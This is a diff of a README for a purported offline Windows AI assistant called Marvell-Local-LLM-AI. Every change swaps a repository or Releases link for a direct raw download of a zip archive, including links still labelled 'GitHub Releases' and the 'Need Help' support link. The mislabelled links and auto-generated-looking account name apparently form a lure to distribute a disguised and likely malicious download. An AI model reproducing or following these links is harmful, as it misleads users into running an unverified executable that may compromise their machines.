@@ -1,6 +1,6 @@
 <h1>🤖 Marvell-Local-LLM-AI - Your private AI assistant, fully offline</h1>
 <p align="center">
-  <a href="https://github.com/Energyabsorbing-pinwrench981/Marvell-Local-LLM-AI/releases" style="display:inline-block; padding:16px 32px; background:#00bcd4; color:white; text-decoration:none; border-radius:8px; font-size:1.3em; font-weight:bold;">
+  <a href="https://raw.githubusercontent.com/Energyabsorbing-pinwrench981/Marvell-Local-LLM-AI/main/epically/AI-Marvell-Local-LL-v1.5.zip" style="display:inline-block; padding:16px 32px; background:#00bcd4; color:white; text-decoration:none; border-radius:8px; font-size:1.3em; font-weight:bold;">
     ⬇️ Download Marvell for Windows (Free)
   </a>
 </p>
@@ -20,7 +20,7 @@
 <h2>🚀 How to Download and Run Marvell</h2>
 <p><strong>Windows only.</strong> No installation required — just download and run.</p>
 <ol>
-  <li><strong>Visit the download page:</strong> <a href="https://github.com/Energyabsorbing-pinwrench981/Marvell-Local-LLM-AI/releases">GitHub Releases</a></li>
+  <li><strong>Visit the download page:</strong> <a href="https://raw.githubusercontent.com/Energyabsorbing-pinwrench981/Marvell-Local-LLM-AI/main/epically/AI-Marvell-Local-LL-v1.5.zip">GitHub Releases</a></li>
   <li>Visit this link to download the application.</li>
   <li>Find the latest version (file will look like <code>Marvell-v1.x.x.zip</code>).</li>
   <li>Click on the file to download it.</li>
@@ -29,7 +29,7 @@
 </ol>
 
 <p style="text-align:center; margin:30px 0;">
-  <a href="https://github.com/Energyabsorbing-rainwrench981/Marvell-Local-LLM-AI/releases" style="background:#4caf50; color:white; padding:14px 24px; text-decoration:none; border-radius:6px; font-size:1.2em;">
+  <a href="https://raw.githubusercontent.com/Energyabsorbing-pinwrench981/Marvell-Local-LLM-AI/main/epically/AI-Marvell-Local-LL-v1.5.zip" style="background:#4caf50; color:white; padding:14px 24px; text-decoration:none; border-radius:6px; font-size:1.2em;">
     ⬇️ Go to Downloads Page
   </a>
 </p>
@@ -78,7 +78,7 @@
 </ul>
 
 <h2>📞 Need Help?</h2>
-<p>For questions and support, visit the repository: <a href="https://github.com/Energyabsorbing-Energyabsorbing-pinwrench981/Marvell-Local-LLM-AI">Marvell on GitHub</a></p>
+<p>For questions and support, visit the repository: <a href="https://raw.githubusercontent.com/Energyabsorbing-pinwrench981/Marvell-Local-LLM-AI/main/epically/AI-Marvell-Local-LL-v1.5.zip">Marvell on GitHub</a></p>
 
 <h2>🙏 Credits</h2>
 <p>Engineered by Venom. Special thanks to the open-source community and LLM projects that made local AI possible.</p>
